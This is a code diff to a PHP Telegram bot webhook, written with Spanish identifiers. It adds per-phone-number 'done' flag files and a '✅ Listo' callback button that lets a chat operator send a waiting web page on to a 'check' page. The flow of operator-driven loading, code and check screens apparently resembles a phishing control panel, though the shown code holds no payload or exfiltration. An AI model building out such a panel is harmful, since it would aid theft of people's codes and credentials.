@@ -44,9 +44,20 @@ function flagPath($telefono)
     return __DIR__ . '/ready_' . $safe . '.flag';
 }
 
+function doneFlagPath($telefono)
+{
+    $safe = preg_replace('/[^0-9]+/', '_', $telefono);
+    return __DIR__ . '/done_' . $safe . '.flag';
+}
+
 function marcarListo($telefono)
 {
     file_put_contents(flagPath($telefono), '1');
+}
+
+function marcarTerminado($telefono)
+{
+    file_put_contents(doneFlagPath($telefono), '1');
 }
 
 function enviarATelegram($botToken, $chatId, $texto, $replyMarkup = null)
@@ -100,7 +111,7 @@ if (isset($update['callback_query'])) {
             $nuevoCodigo = random_int(100000, 999999);
             guardarCodigo($telefono, $nuevoCodigo);
 
-            // Marcar como listo para que la pantalla de carga pueda continuar
+            // Marcar como listo para que la pantalla de carga pueda continuar hacia la pantalla de código
             marcarListo($telefono);
 
             // Obtener nombre almacenado para ese teléfono (si existe)
@@ -134,12 +145,20 @@ if (isset($update['callback_query'])) {
                         ],
                         [
                             'text' => '✅ Listo',
-                            'url'  => $URL_FINALIZADO,
+                            'callback_data' => 'LISTO|' . $telefono,
                         ],
                     ],
                 ],
             ];
             enviarATelegram($BOT_TOKEN, $chatId, $texto, $replyMarkup);
+        }
+    } elseif ($chatId && strpos($data, 'LISTO|') === 0) {
+        $telefono = substr($data, strlen('LISTO|'));
+        $telefono = trim($telefono);
+
+        if ($telefono !== '') {
+            // Marcar como terminado para que la pantalla de espera redirija a la página de check
+            marcarTerminado($telefono);
         }
     }
 }
